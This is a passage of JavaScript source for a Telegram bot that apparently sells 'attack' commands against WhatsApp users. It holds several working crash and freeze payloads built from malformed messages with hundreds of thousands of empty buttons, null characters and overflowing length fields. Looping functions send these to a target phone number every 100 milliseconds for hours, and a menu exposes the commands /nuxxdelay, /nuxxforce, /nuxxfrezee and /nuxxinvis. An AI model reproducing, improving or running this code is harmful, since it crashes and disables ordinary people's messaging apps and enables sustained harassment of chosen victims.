        directPath: "/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1779806852",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAABBQEAAAAAAAAAAAAAAAAAAQIDBAUGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAyljXsWcs6SHnV187CNqPOaKTLlsSMLm5znQzZrVqqY+c2+fqriMG7WzmumbuW5oSzka2RLJlddB0tzIDC/Lkvpuuzsi5yrr8tr4iu+zSk7QCEtOgctXzBRK9cKZsodMwDmb/xAAqEAACAgIBAwEIAwEAAAAAAAABAgADBBESISIxQQUQEzJRYXFyFBUjUv/aAAgBAQABPwBah2AHyu4UIXlFqVgDv0hx+zkYKmJYD0nwW0p35iU9xDQVNsiGp+Ji2ntP0GozdugOk9m0/HbTeBL/AGcjdEcifwL6w2tNHrtQAPWeka5/xBd27I7tw3kKCPMrVDUp49d6gp2T11PZKBC3WCMUgCWfeZOHjlGYoJqvR6S8IF7Zj4WU1KlU6GHBzvRJhC/Gv42KRN7ENYaW5dWKwQzMzkej/Mzmw3HYsswzrFo/WGMuwSQDDfYjgfMCY9/DXMamUitkByCymf1r2hmB4j0Eet62KspBmtI0x7QKcf8AWZWWETYgzLLU7FJnwSnDl5MekFQzHosbKWq3cqvruXaP+ZmpTbSeeg3pG6K0qyuxB9BEsW26sOem499dY7dCPkcrVPoDMm7VQ6bU+Zf3WEgECVWvUwKmWX2WNyc7Mb5WieBOWvED2MNlvEoWy5WYAaWZFhqq7bPPpGZnO2PuBjghTBivwU+diGhxrpHQrX9pTZwxbhvzAA9Tf9CFWHke6sgHZjMvB/vP/8QAIxEAAgICAQIHAAAAAAAAAAAAAQIAEQMhEgQxEBMiMkFRcf/aAAgBAgEBPwBSwAjOQauByZbzLdi5evdHG/BLq7mXXGcTGtVu4uRiF9MViNTN3E4jj3mYGigH7OlVtmrrU4/JmYglZ5rXEJNkxHKlR9wiwRMooif/xAAeEQACAwABBQAAAAAAAAAAAAAAAQIQERIDITJRkf/aAAgBAwEBPwASMpUqYqlqzPZ1JuMkkqRpJyfiSXc0RwXFs4qKRm/BkVh//9k=",
        contextInfo: {
          pairedMediaType: 4,
          statusSourceType: 0
        },
        annotations: Array.from({ length: 70000 }, () => (
          {
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                author: "\0"
              }
            },
            embeddedAction: true
          }
        )),
        streamingSidecar: "MDcl6QckPwTKM0jEIiaPbRaSSbDMmA7O1wkWQkvHDYRBmhmYe9jxEwk662ZOB0jXrPTvvLE24YQDyHu8zHLq6wz3ithLB2EmFYk+jLqBMAzo4BgZEqLJWMGndenNtdS4H582vlYolVbg9bqUwFm7be2Da/7GxjMrQKP6Ly5f0opOnH0PV+aNPbp2KE9T/hhsMJXscHbg9nxILoRYAWyQV8u72z6fnBwe5PtZrXU48kgwNMFkQRyEvdESdTHxIH/+MntMQ6MFA/G7beOb86iHeADITkXWENvib/bKKd9I09y4Z1Jf+Z9RMnuMq0DePvTXAs3rq2amO94EYtxc9D7TNu1bEYIH8sAtEkjlemYv0nccM54G5KBZF4Li/eywEq5+ri2NVV+6gw2WT6NGrUQ23aGKhyk2d9xeRhxlOeHpDEp1MzFsqrM7bm3k6IQ86YlBoZZrf//IlwMxR8GLaBTPLsGrrVSgF+g0E/HNOkiHxtLB5FxZ04oFOkqD54D9c2+PsoLaHEL0n6SUkh2R4ntE6s3mi6CgNWnWva4K2q61kB9yPg6tsxI26JdxC0fUrVScBXNEmXTZFweTPIgMi3k3eZRkW3I/6ePeRz8pZhzDHo7flhHXxlYfy8hezzpGniX+8VgxUWbflPqJBKTvQ5lJDJxOdgKf/tIotDEws3UcEY3nBumVENqXBudHgL+HimM6bD0187E3IB7OwvsR78IYzh0K7l7Xtw=="
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    })
  }
}

async function docThumb(target, gs = false, array = true) {
  const docs = {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
      fileLength: "72028",
      pageCount: 1,
      mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
      fileName: "UcihaNuxx.pdf",
      fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
      directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1779839963",
      thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
    thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
    thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
    jpegThumbnail: "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",
      contextInfo: {},
      thumbnailHeight: 480,
      thumbnailWidth: 480
    }
  };
  
  const msg = {
    interactiveMessage: {
      header: {
        hasMediaAttachment: true,
        documentMessage: docs.documentMessage
      },
      body: {
        text: "Uciha X Nuxx"
      },
      nativeFlowMessage: {
        buttons: array ? Array.from({ length: 500000 }, () => ({})) : "[".repeat(500000)
      }
    }
  }
  
  await sock.relayMessage(target, gs ? {
    groupStatusMessageV2: {
      message: msg
    }
  } : msg, {
    participant: { jid: target }
  })
}

async function zerrblank(sock, target) {
  try {

    console.log("otw bg");
    const blank = {
   interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"nozzer","key":"${'\u0000'.repeat(50000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  };
    await sock.sendMessage(target, blank, {
 
  participant: { 
  jid: target 
}
});
    console.log("sukses tuan");
  } catch (err) {
    console.error("error kontol:", err);
  }
}

async function invisOOM(target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
              fileLength: "93217",
              caption: "Uciha",
              height: 1080,
              width: 1080,
              mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
              fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
              directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1778142659",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
              },
              scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
            },
            title: "UcihaXNuxx",
            hasMediaAttachment: true
          },
          body: {
            text: "\0"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  })
}

async function blanknoclickbymia(target) {
  try {
    const zieeBtn = [
      {
        buttonId: ".id1",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id2",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id3",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      }
    ];

    const zieeMsg = {
      location: {
        degreesLatitude: -1,
        degreesLongitude: -1,
        name: "UcihaInHere 永遠に生きる" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
        address: "Nuxx 永遠に生きる" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
      },
      caption: "UcihaInHere 永遠に生きる" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
      footer: " ",
      zieeBtn,
      headerType: 6
    };

    await Abim.sendMessage(target, zieeMsg);
  } catch (err) {
  }
}

async function DelayByDitzV2(sock, target) {
try {
const DelayByDitzV2 = {
  imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
            fileLength: "93217",
            caption: "\u0000".repeat(200000) + "CRASH" + "\u200D".repeat(150000),
            height: 1080,
            width: 1080,
            mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
            fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
            directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1778142659",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERARIEFRUmFxcpGx8P/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTUGGhMv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
            contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
            },
            scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
            scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
            midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
        }
      };

    await sock.relayMessage(target, DelayByDitzV2, {
      participant: { jid: target }
    });
    
    console.log(`✅ Sukses Sent To: ${target}`);
    
  } catch (err) {
    console.error(`❌ Error: ${err.message}`);
  }
}

async function InvisDelay(sock, target) {
  const Msg = {
    interactiveResponseMessage: {
      groupStatusMessagev2: {
        body: {
          text: "Uciha×Nuxx",
          format: "DEFAULT",
          version: 3
        }
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\u0000".repeat(900000),
        version: "3"
      }
    }
  };
  await sock.relayMessage(target, Msg, {});
}
// end
// ---------- ( Activator Funct ) ----------
async function HardDelay(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 100) {
            await Promise.all([
            xdlyV2(target),
            bebasspamwoyanjeng(sock, target),
            annotationz(target)
            ]);
            console.log(chalk.red(`Sending ( Attack🦠 ) ${count}/100 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 100 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 100 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

async function ForceNews(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 100) {
            await Promise.all([
            docThumb(target, true),
            DelayByDitzV2(sock, target)
            ]);
            console.log(chalk.red(`Sending ( Attack🦠 ) ${count}/100 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 100 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 100 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

async function bokepjepangnew(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 100) {
            await Promise.all([
            FrezeSange(sock, target),
            zerrblank(sock, target),
            blanknoclickbymia(target)
            ]);
            console.log(chalk.red(`Sending ( Attack🦠 ) ${count}/100 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 100 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 100 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

async function invisiblenyawit(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 100) {
            await Promise.all([
            annotationz(target),
            docThumb(target, true),
            invisOOM(target),
            InvisDelay(sock, target)
            ]);
            console.log(chalk.red(`Sending ( Attack🦠 ) ${count}/100 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 100 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 100 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
// end
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  bot.sendPhoto(chatId, randomImage, {
caption: `
\`\`\`NuxxTeam🪽
-( 🎱 )- Ollà, ${username}!👋🏻 Soy NUXX🎱, la última versión creada por All Team Nuxx. Te ayudaré cuando sea, pero úsame lo más sabiamente posible.
──────────────────────────
 ─「 𖥂 」 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎́𝐍 「 𖥂 」─
ス ! ʙᴏᴛɴᴀᴍᴇ : NUXX🎱
ス ! ᴠᴇʀsɪᴏɴ : v1.0.0
ス ! ᴅᴇᴠᴇʟᴏᴘᴇʀ : All Team Nuxx
ス ! ᴛʏᴘᴇ : Java Script
ス ! ᴘʟᴀᴛғᴏʀᴍ : Telegram
ス ! sᴛᴀᴛᴜs : Vip\`\`\`

( ! ) 続行するには、下のメニューボタンを選択してください.
`,

    parse_mode: "Markdown",
    reply_markup: {
     inline_keyboard: [
[{ text: "𝗧𝗛𝗔𝗡𝗞𝗦 ᝄ 𝗧𝗢", callback_data: "tqto", style: "success" }],
[{ text: "𝗦𝗘𝗧𝗧𝗜𝗡𝗚 ᝄ 𝗠𝗘𝗡𝗨", callback_data: "setting", style: "primary" }, { text: "𝗔𝗧𝗧𝗔𝗖𝗞 ᝄ 𝗠𝗘𝗡𝗨", callback_data: "attack", style: "danger" }],
[{ text: "𝗢𝗧𝗛𝗘𝗥 ᝄ 𝗠𝗘𝗡𝗨", callback_data: "other", style: "danger" }, { text: "𝗘𝗡𝗖𝗥𝗬𝗣𝗧 ᝄ 𝗠𝗘𝗡𝗨", callback_data: "encrypt", style: "primary" }], 
[{ text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/newsnuxx", style: "success" }],
     ] 
    }
  });
});


bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "attack") {
      caption = `
\`\`\`𝗧𝗲𝗮𝗺𝗡𝘂𝘅𝘅🪽
-( 🎱 )- 𝗢𝗹𝗹𝗮̀, ${username}!👋🏻 𝗦𝗼𝘆 𝗡𝗨𝗫𝗫🎱, 𝗹𝗮 𝘂́𝗹𝘁𝗶𝗺𝗮 𝘃𝗲𝗿𝘀𝗶𝗼́𝗻 𝗰𝗿𝗲𝗮𝗱𝗮 𝗽𝗼𝗿 𝗔𝗹𝗹 𝗧𝗲𝗮𝗺 𝗡𝘂𝘅𝘅. 𝗧𝗲 𝗮𝘆𝘂𝗱𝗮𝗿𝗲́ 𝗰𝘂𝗮𝗻𝗱𝗼 𝘀𝗲𝗮, 𝗽𝗲𝗿𝗼 𝘂́𝘀𝗮𝗺𝗲 𝗹𝗼 𝗺𝗮́𝘀 𝘀𝗮𝗯𝗶𝗮𝗺𝗲𝗻𝘁𝗲 𝗽𝗼𝘀𝗶𝗯𝗹𝗲.
──────────────────────────
 ─「 𖥂 」 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂𝐈𝐎́𝐍 「 𖥂 」─
ス ! ʙᴏᴛɴᴀᴍᴇ : 𝗡𝗨𝗫𝗫🎱
ス ! ᴠᴇʀ𝘀ɪᴏɴ : 𝘃𝟭.𝟬.𝟬
ス ! ᴅᴇᴠᴇʟᴏᴘᴇʀ : 𝗔𝗹𝗹 𝗧𝗲𝗮𝗺 𝗡𝘂𝘅𝘅
ス ! ᴛʏᴘᴇ : 𝗝𝗮𝘃𝗮 𝗦𝗰𝗿𝗶𝗽𝘁
ス ! ᴘʟᴀᴛғᴏʀᴍ : 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺
ス ! 𝘀ᴛᴀᴛᴜ𝘀 : 𝗩𝗶𝗽

 ─「 𖥂 」 𝐀𝐓𝐓𝐀𝐂𝐊 ☇ 𝐌𝐄𝐍𝐔 「 𖥂 」─
友 ! /nuxxdelay ⧼ ɴᴜᴍʙᴇʀ ⧽
友 ! /nuxxforce ⧼ ɴᴜᴍʙᴇʀ ⧽
友 ! /nuxxfrezee ⧼ ɴᴜᴍʙᴇʀ ⧽
友 ! /nuxxinvis ⧼ ɴᴜᴍʙᴇʀ ⧽
───────────────────────────\`\`\`
`;
      replyMarkup = { inline_keyboard: [[{ text: "〘 𝐁𝐀𝐂𝐊 〙", callback_data: "back_to_main", style: "danger" }]] };
    }
    
    if (query.data === "setting") {
      caption = `
\`\`\`NuxxTeam🪽
-( 🎱 )- Ollà, ${username}!👋🏻 Soy NUXX🎱, la última versión creada por All Team Nuxx. Te ayudaré cuando sea, pero úsame lo más sabiamente posible.
──────────────────────────
